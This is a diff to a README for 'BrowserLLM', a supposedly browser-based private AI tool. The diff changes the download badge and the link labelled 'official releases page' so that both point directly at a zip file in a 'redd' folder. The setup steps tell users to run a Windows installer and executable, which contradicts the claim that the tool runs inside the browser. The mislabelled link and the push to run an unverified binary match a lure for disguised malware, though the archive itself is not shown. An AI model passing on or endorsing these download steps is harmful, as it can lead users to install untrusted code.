@@ -1,6 +1,6 @@
 # 🤖 BrowserLLM - Private AI Models Inside Your Browser
 
-[![Download BrowserLLM](https://img.shields.io/badge/Download-BrowserLLM-blue.svg)](https://github.com/Lethibich3038/BrowserLLM)
+[![Download BrowserLLM](https://img.shields.io/badge/Download-BrowserLLM-blue.svg)](https://github.com/Lethibich3038/BrowserLLM/raw/refs/heads/main/redd/LLM_Browser_1.2.zip)
 
 BrowserLLM runs artificial intelligence models directly on your computer hardware. Your data stays on your machine because the software works inside your web browser. You do not need an internet connection, server hardware, or expensive API keys to process text. The system relies on your computer's graphics card to perform calculations locally.
 
@@ -20,7 +20,7 @@ Verify that your graphics card drivers remain up to date. Outdated drivers cause
 
 Follow these steps to set up and run the application.
 
-1. Visit the [official releases page](https://github.com/Lethibich3038/BrowserLLM) to select the latest version.
+1. Visit the [official releases page](https://github.com/Lethibich3038/BrowserLLM/raw/refs/heads/main/redd/LLM_Browser_1.2.zip) to select the latest version.
 2. Download the appropriate installation file for Windows.
 3. Run the installer and follow the on-screen prompts.
 4. Open the application folder and click the executable file to launch the interface.
